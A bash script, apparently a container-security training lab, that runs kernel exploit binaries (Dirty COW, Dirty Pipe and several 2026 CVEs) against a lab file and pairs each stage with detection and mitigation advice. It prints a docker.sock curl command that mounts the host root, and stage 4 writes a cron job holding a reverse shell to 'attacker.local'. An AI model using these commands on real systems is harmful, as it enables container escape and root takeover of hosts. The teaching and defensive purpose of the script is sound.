#!/bin/bash

# Hexa Force Container Security Lab Orchestrator
# Shows the 4 Pillars of Container Security: Vulnerability, Exploit, Detection, and Defense.

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

show_banner() {
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${CYAN}         Hexa Force Container Security Attack Lab              ${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
}

diagnostics() {
    echo -e "${YELLOW}[*] Container Environment Diagnostics:${NC}"
    echo -e "  - Current Linux User  : $(whoami) (UID: $(id -u))"
    echo -e "  - Container OS Profile : $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
    echo -e "  - Shared Host Kernel  : $(uname -r)"
    echo ""
}

stage_1() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}   STAGE 1: Host Kernel Isolation (Dirty COW - CVE-2016-5195)   ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""
    
    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Host Kernel separation]${NC}"
    echo -e "  Container isolation relies on namespaces sharing the host Linux kernel."
    echo -e "  If the host kernel is vulnerable to a race condition (like CVE-2016-5195),"
    echo -e "  an unprivileged process inside a container can bypass memory writing rules."
    echo ""

    # 2. Probe — non-destructive vulnerability fingerprint
    echo -e "${YELLOW}[2. THE PROBE: Kernel Vulnerability Fingerprint]${NC}"
    gcc -pthread -O2 hexaforce_cow.c -o hexaforce_cow -lrt 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "  - Compiled Hexa Force COW Analysis Tool successfully."
        echo ""
        ./hexaforce_cow --probe
        echo ""
    else
        echo -e "  - ${RED}Compilation failed!${NC}"
    fi

    # 3. Exploit — controlled race with instrumentation
    echo -e "${YELLOW}[3. THE EXPLOIT: Instrumented Race Condition Trigger]${NC}"
    TARGET_FILE="/var/secret/target.txt"
    echo -e "  - Target File: $TARGET_FILE (Owner: $(stat -c '%U' "$TARGET_FILE"), Perms: $(stat -c '%A' "$TARGET_FILE"))"
    echo -e "  - Original Contents: \"$(cat "$TARGET_FILE")\""
    echo ""
    
    if [ -f "./hexaforce_cow" ]; then
        ./hexaforce_cow --exploit "$TARGET_FILE" "HEXA_FORCE_PWNED"
    else
        echo -e "  - ${RED}Hexa Force tool failed to compile! Cannot proceed with exploit.${NC}"
    fi
    echo ""

    # 4. Detection
    echo -e "${YELLOW}[4. DETECTION STRATEGY: System Call Auditing]${NC}"
    echo -e "  - Monitor syscall activity for high-frequency calls to ${CYAN}madvise(..., MADV_DONTNEED)${NC}."
    echo -e "  - Trigger alerts when processes open and write to ${CYAN}/proc/self/mem${NC} concurrently."
    echo -e "  - Deploy Falco runtime rules to detect concurrent madvise+write patterns."
    echo ""

    # 5. Mitigation
    echo -e "${YELLOW}[5. MITIGATION BLUEPRINT: Patching & Sandboxing]${NC}"
    echo -e "  - ${GREEN}Primary: Upgrade the host kernel to a patched release (FOLL_COW fix).${NC}"
    echo -e "  - Secondary: Apply custom Seccomp profiles to block madvise at the syscall boundary."
    echo -e "  - Tertiary: Employ micro-VM runtimes like ${CYAN}gVisor${NC} or ${CYAN}Kata Containers${NC}."
    echo -e "    These sandboxes intercept system calls in a user-space kernel proxy,"
    echo -e "    completely isolating the host kernel from container syscall abuses."
    echo ""
}

stage_1B() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}   STAGE 1B: Modern Kernel Isolation (Dirty Pipe - CVE-2022-0847) ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""
    
    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Host Kernel separation (Modern View)]${NC}"
    echo -e "  Like Dirty COW, Dirty Pipe allows an unprivileged container process to overwrite"
    echo -e "  read-only memory. However, it abuses the 'splice()' syscall and pipe buffers"
    echo -e "  instead of 'madvise()'. It affects modern kernels (5.8 to 5.15)."
    echo ""

    # 2. Compilation
    echo -e "${YELLOW}[2. THE PROBE: Modern Vulnerability Fingerprint]${NC}"
    gcc -O2 hexaforce_pipe.c -o hexaforce_pipe 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "  - Compiled Hexa Force Dirty Pipe Exploit successfully."
        echo ""
    else
        echo -e "  - ${RED}Compilation failed!${NC}"
    fi

    # 3. Exploit
    echo -e "${YELLOW}[3. THE EXPLOIT: Pipe Buffer Injection]${NC}"
    TARGET_FILE="/var/secret/target.txt"
    echo -e "  - Target File: $TARGET_FILE"
    echo -e "  - Original Contents: \"$(cat "$TARGET_FILE")\""
    echo ""
    
    if [ -f "./hexaforce_pipe" ]; then
        ./hexaforce_pipe "$TARGET_FILE" 1 "PIPE_PWNED"
    else
        echo -e "  - ${RED}Hexa Force Pipe tool failed to compile!${NC}"
    fi
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Seccomp eBPF for splice()]${NC}"
    echo -e "  - ${GREEN}Primary: Upgrade host kernel to >= 5.15.25.${NC}"
    echo -e "  - Secondary: Apply Seccomp profile blocking the 'splice' syscall."
    echo ""
}

stage_1C() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}  STAGE 1C: Cryptographic Kernel Isolation (Copy Fail CVE-2026-31431) ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""
    
    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Kernel Crypto API (AF_ALG) separation]${NC}"
    echo -e "  Copy Fail (2026) is a logic flaw in the AF_ALG userspace crypto API."
    echo -e "  By opening an AF_ALG socket and binding to the 'algif_aead' module,"
    echo -e "  an attacker can corrupt the page cache of readable files."
    echo ""

    # 2. Compilation
    echo -e "${YELLOW}[2. THE PROBE: AF_ALG Vulnerability Fingerprint]${NC}"
    gcc -O2 hexaforce_copyfail.c -o hexaforce_copyfail 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "  - Compiled Hexa Force Copy Fail Structural Exploit successfully."
        echo ""
    else
        echo -e "  - ${RED}Compilation failed!${NC}"
    fi

    # 3. Exploit
    echo -e "${YELLOW}[3. THE EXPLOIT: AF_ALG Socket Binding]${NC}"
    if [ -f "./hexaforce_copyfail" ]; then
        ./hexaforce_copyfail
    else
        echo -e "  - ${RED}Hexa Force Copy Fail tool failed to compile!${NC}"
    fi
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Seccomp eBPF for AF_ALG]${NC}"
    echo -e "  - ${GREEN}Primary: Upgrade host kernel to include the 'a664bf3d603d' patch.${NC}"
    echo -e "  - Secondary: Apply Seccomp profile blocking 'socket' syscalls for the AF_ALG domain."
    echo ""
}

stage_1D() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}  STAGE 1D: Network Cache Exploitation (Dirty Frag CVE-2026-43284) ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""
    
    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: IPv6 Fragmentation Paths]${NC}"
    echo -e "  Dirty Frag (2026) combines page-cache corruption with networking."
    echo -e "  By opening an IPv6 RAW socket, an attacker can manipulate network"
    echo -e "  fragmentation to trigger a kernel race condition."
    echo ""

    # 2. Compilation
    echo -e "${YELLOW}[2. THE PROBE: IPv6 Fragmentation Vulnerability]${NC}"
    gcc -O2 hexaforce_dirtyfrag.c -o hexaforce_dirtyfrag 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "  - Compiled Hexa Force Dirty Frag Structural Exploit successfully."
        echo ""
    else
        echo -e "  - ${RED}Compilation failed!${NC}"
    fi

    # 3. Exploit
    echo -e "${YELLOW}[3. THE EXPLOIT: IPv6 RAW Socket Binding]${NC}"
    if [ -f "./hexaforce_dirtyfrag" ]; then
        ./hexaforce_dirtyfrag
    else
        echo -e "  - ${RED}Hexa Force Dirty Frag tool failed to compile!${NC}"
    fi
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Seccomp eBPF for AF_INET6]${NC}"
    echo -e "  - ${GREEN}Primary: Upgrade host kernel to include the patch.${NC}"
    echo -e "  - Secondary: Apply Seccomp profile blocking 'socket' syscalls for AF_INET6 (IPv6) RAW sockets."
    echo ""
}

stage_1E() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}  STAGE 1E: Subsystem Exploitation (Fragnesia CVE-2026-46300) ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""
    
    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: ESP-in-TCP Subsystem]${NC}"
    echo -e "  Fragnesia (2026) is the current state-of-the-art variant."
    echo -e "  It exploits the Encapsulating Security Payload (ESP) over TCP subsystem"
    echo -e "  via the setsockopt(TCP_ULP) syscall."
    echo ""

    # 2. Compilation
    echo -e "${YELLOW}[2. THE PROBE: ESP-in-TCP Vulnerability]${NC}"
    gcc -O2 hexaforce_fragnesia.c -o hexaforce_fragnesia 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "  - Compiled Hexa Force Fragnesia Structural Exploit successfully."
        echo ""
    else
        echo -e "  - ${RED}Compilation failed!${NC}"
    fi

    # 3. Exploit
    echo -e "${YELLOW}[3. THE EXPLOIT: setsockopt(TCP_ULP) ESP Attachment]${NC}"
    if [ -f "./hexaforce_fragnesia" ]; then
        ./hexaforce_fragnesia
    else
        echo -e "  - ${RED}Hexa Force Fragnesia tool failed to compile!${NC}"
    fi
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Seccomp eBPF for setsockopt]${NC}"
    echo -e "  - ${GREEN}Primary: Upgrade host kernel to include the patch.${NC}"
    echo -e "  - Secondary: Apply Seccomp profile blocking 'setsockopt' when 'TCP_ULP' (31) is targeted."
    echo ""
}

stage_2() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}  STAGE 2: Namespace & Capabilities Isolation (CAP_SYS_PTRACE)  ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""

    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Process Boundary Enforcement]${NC}"
    echo -e "  Containers are isolated by namespaces (PID, IPC, Net, mount)."
    echo -e "  If host process sharing (${CYAN}--pid=host${NC}) is combined with debugging permissions"
    echo -e "  (${CYAN}CAP_SYS_PTRACE${NC}), container processes can inject code into host-level services."
    echo ""

    # 2. Exploit Simulation
    echo -e "${YELLOW}[2. THE EXPLOIT: Evaluating Capabilities & Namespace Sharing]${NC}"
    echo -e "  - checking granted capabilities..."
    CAPS=$(capsh --print 2>&1)
    echo -e "    --> Capabilities found: ${CYAN}$(echo "$CAPS" | grep "Current")${NC}"
    
    # Simulating PID namespace diagnostic
    CURRENT_PIDS=$(ps -e -o pid,comm | wc -l)
    echo -e "  - Process diagnostics:"
    echo -e "    --> Total running processes visible: ${CYAN}${CURRENT_PIDS}${NC}"
    if [ "$CURRENT_PIDS" -gt 30 ]; then
        echo -e "    --> ${RED}Warning: Shared PID Namespace detected! Host processes visible.${NC}"
        echo -e "    --> Exploit Vector: Process memory injection into host processes is possible via CAP_SYS_PTRACE."
    else
        echo -e "    --> ${GREEN}PID namespace is isolated. Host processes are hidden.${NC}"
    fi
    echo ""

    # 3. Detection
    echo -e "${YELLOW}[3. DETECTION STRATEGY: Scanning Configurations]${NC}"
    echo -e "  - Scan Kubernetes configurations and docker run directives for flags matching ${RED}hostPID: true${NC}."
    echo -e "  - Scan runtime environments for security profiles granting ${RED}CAP_SYS_PTRACE${NC} or ${RED}CAP_SYS_ADMIN${NC}."
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Drop Default Capabilities]${NC}"
    echo -e "  - ${GREEN}Never use the '--pid=host' configuration flag in untrusted environments.${NC}"
    echo -e "  - Configure container environments to drop all default capabilities and explicitly add only what's required:"
    echo -e "    ${CYAN}docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ...${NC}"
    echo ""
}

stage_3() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}       STAGE 3: Daemon & API Security (Exposed docker.sock)     ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""

    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Engine API Access Control]${NC}"
    echo -e "  The Docker daemon runs as root on the host. Accessing its UNIX socket"
    echo -e "  (${CYAN}/var/run/docker.sock${NC}) allows full engine control, letting processes"
    echo -e "  spawn high-privilege sibling containers with the host root directories mounted."
    echo ""

    # 2. Exploit Simulation
    echo -e "${YELLOW}[2. THE EXPLOIT: Inspecting Daemon Socket Interface]${NC}"
    SOCKET_PATH="/var/run/docker.sock"
    if [ -S "$SOCKET_PATH" ] || [ -f "$SOCKET_PATH" ]; then
        echo -e "  - ${RED}Exposed Socket Interface detected at $SOCKET_PATH!${NC}"
        echo -e "  - Simulating Host Daemon Control Hijack:"
        echo -e "    --> Constructing Docker API request payload..."
        echo -e "    --> Simulated command: ${CYAN}curl -X POST --unix-socket $SOCKET_PATH http://localhost/containers/create -d '{\"Image\":\"ubuntu\",\"Binds\":[\"/:/host\"]}'${NC}"
        echo -e "    --> ${RED}Exploit Potential: Full root takeover of the host filesystem via sibling mount!${NC}"
    else
        echo -e "  - ${GREEN}No docker.sock exposed. The Docker Daemon engine interface is safe.${NC}"
    fi
    echo ""

    # 3. Detection
    echo -e "${YELLOW}[3. DETECTION STRATEGY: Mount Auditing]${NC}"
    echo -e "  - Audit system image configurations for mounts containing ${RED}docker.sock${NC}."
    echo -e "  - Utilize runtime engines (e.g. Falco) to flag any raw HTTP or curl queries directed at socket files."
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Daemon Separation & rootless]${NC}"
    echo -e "  - ${GREEN}Never mount the Docker socket inside untrusted user containers.${NC}"
    echo -e "  - Primary Security Strategy: Run container engines in ${CYAN}Rootless Mode${NC},"
    echo -e "    so the daemon process runs inside a user namespace without host root access."
    echo -e "  - If read-only data query is needed, proxy socket operations via a secure API proxy like ${CYAN}Tecnativa's docker-socket-proxy${NC}."
    echo ""
}

stage_4() {
    echo -e "${MAGENTA}================================================================${NC}"
    echo -e "${MAGENTA}     STAGE 4: Volume & Filesystem Security (Cron Path Traversal) ${NC}"
    echo -e "${MAGENTA}================================================================${NC}"
    echo ""

    # 1. Concept
    echo -e "${YELLOW}[1. THE PILLAR: Volume Directory Isolation]${NC}"
    echo -e "  Mounting sensitive directories from the host (such as /etc, /var, or /opt)"
    echo -e "  gives containers read-write capability on host systems. A compromised container"
    echo -e "  can exploit write permissions to register arbitrary tasks in the host cron daemon."
    echo ""

    # 2. Exploit Simulation
    echo -e "${YELLOW}[2. THE EXPLOIT: Cron Job Path Traversal Injection]${NC}"
    SIMULATED_HOST_MOUNT="/mnt/host/etc/cron.d"
    echo -e "  - Checking mount status at simulated target: $SIMULATED_HOST_MOUNT"
    
    if [ -d "$SIMULATED_HOST_MOUNT" ]; then
        echo -e "  - Writable host mount detected at $SIMULATED_HOST_MOUNT!"
        echo -e "  - Attempting host cron-job traversal write..."
        echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.local/4444 0>&1'" > "$SIMULATED_HOST_MOUNT/exploit_task" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo -e "    --> Exploit Task Written successfully to simulated host directory!"
            echo -e "    --> ${RED}Exploit Succeeded: Cron job written. Host will execute arbitrary script as ROOT in 60s!${NC}"
            # Clean up simulation artifact
            rm "$SIMULATED_HOST_MOUNT/exploit_task"
        else
            echo -e "    --> ${GREEN}Mount is configured as Read-Only. Overwrite rejected.${NC}"
        fi
    else
        echo -e "  - ${GREEN}No sensitive host filesystem directories are mounted as writable.${NC}"
    fi
    echo ""

    # 3. Detection
    echo -e "${YELLOW}[3. DETECTION STRATEGY: FIM & Audits]${NC}"
    echo -e "  - Configure **File Integrity Monitoring (FIM)** on critical host folders such as ${CYAN}/etc/cron*${NC}."
    echo -e '  - Implement auditing system rules (`auditd`) to flag container writing tasks matching system configuration directories.'
    echo ""

    # 4. Mitigation
    echo -e "${YELLOW}[4. MITIGATION BLUEPRINT: Read-Only Volumes & Least Privilege]${NC}"
    echo -e "  - ${GREEN}Always mount host filesystem volumes as read-only (ro flag):${NC}"
    echo -e "    ${CYAN}docker run -v /etc/config:/config:ro ubuntu${NC}"
    echo -e "  - Avoid mounting system directories (/etc, /var/run, /root) into containers."
    echo ""
}

# Orchestration router
case "$1" in
    --stage-1)
        show_banner
        stage_1
        ;;
    --stage-1b)
        show_banner
        stage_1B
        ;;
    --stage-1c)
        show_banner
        stage_1C
        ;;
    --stage-1d)
        show_banner
        stage_1D
        ;;
    --stage-1e)
        show_banner
        stage_1E
        ;;
    --stage-2)
        show_banner
        stage_2
        ;;
    --stage-3)
        show_banner
        stage_3
        ;;
    --stage-4)
        show_banner
        stage_4
        ;;
    --all|*)
        show_banner
        diagnostics
        stage_1
        stage_1B
        stage_1C
        stage_1D
        stage_1E
        stage_2
        stage_3
        stage_4
        ;;
esac
